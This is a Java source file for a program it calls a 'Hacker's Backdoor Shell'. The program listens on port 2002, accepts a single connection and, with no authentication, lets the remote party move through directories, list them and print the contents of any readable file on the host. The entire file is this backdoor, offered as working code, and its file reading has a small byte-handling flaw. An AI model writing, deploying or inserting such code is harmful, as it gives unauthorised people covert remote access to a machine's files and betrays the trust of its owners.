import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class BackdoorShell {

	public static void main(String[] args) {
		
		try {
			ServerSocket server = new ServerSocket(2002);
			Socket client = server.accept();
			String workingDir = System.getProperty("user.dir");
			String prompt = System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
			System.out.println();
			String startDir = workingDir;
	
			
			InputStream in=client.getInputStream();
			OutputStream out=client.getOutputStream();
			
			BufferedReader reader=new BufferedReader(new InputStreamReader(in));
			BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
		
			writer.write("\nWelcome to Hacker's Backdoor Shell\n\n");
			
			while(true) {
				
				writer.write(workingDir+prompt);
				writer.flush();
				String clientCommand=reader.readLine();
				
				String split [] = clientCommand.split(" ");
				
				if(split[0].equalsIgnoreCase("cd")) {
					if(split.length<2){
					writer.write("\nCurrent directory is: "+workingDir+"\n\n");
					}
					if(split.length>=2) {
						if (split[1].equalsIgnoreCase(".")) {
					}
					else if (split[1].equalsIgnoreCase("~")) {
					workingDir = startDir;
					}
					else if (split[1].equalsIgnoreCase("..")) {
						File directory = new File(workingDir);
						if (!workingDir.equals(directory.getParent())) {
							if(directory.getParent()==null) {
								continue; }
							workingDir = directory.getParent();
						}
						else {
						}
					}
					else {
						File directory = new File(workingDir);
						
						String path = directory.getPath();
						
						String tempPath = path+File.separator+split[1];
						
						File temp = new File(tempPath);
						
						if(temp.exists() == true && temp.isDirectory() == true) 
							workingDir = tempPath;	
						
						else if (!temp.exists()||!temp.isDirectory())
							writer.write("\nDirectory " + split[1] + " not found! \n");
						
					}
						
					}
				}
					
				else if(split[0].equalsIgnoreCase("dir")){
					if(split.length<2){
						int fileCount = 0;
						File directory = new File(workingDir);
						File[] files=directory.listFiles();
				
						writer.write("\nList of files in " + workingDir + "\n\r");
						for(int i = 0; i<= files.length-1; i++) 
						{
							if(files[i].isDirectory()) {
						writer.write("" + files[i] + " - Directory\n\r");
							fileCount++;
						}
							else if (files[i].isFile()) {
						writer.write("" + files[i] + " - File\n\r");
							fileCount++;
							}
						
					}
						writer.write("" + fileCount + " file (s) in total \n\r");	
					}
					else if (split.length>=2) {
						
					}
					
					
				}
				
				else if(split[0].equalsIgnoreCase("cat")) {
					if(split.length<2){
					}
					else if(split.length>=2) {
					File directory = new File (workingDir);
					File givenFile = new File(directory.getPath()+File.separator+split[1]);
					if (!givenFile.exists() || givenFile.isDirectory()) {
					writer.write("File "+ split[1] + " not found!\n");}
					else {
						in=new FileInputStream(givenFile);			
						byte b;
						while((b=(byte)in.read())!=-1) {
							writer.write(""+(char)b);
						}
					}
					}	
					
				}
				
			}
			
			

		}
		catch(IOException e) {
			e.printStackTrace();
		}
		catch(NullPointerException c) {
			c.printStackTrace();
		}
		

	}

}


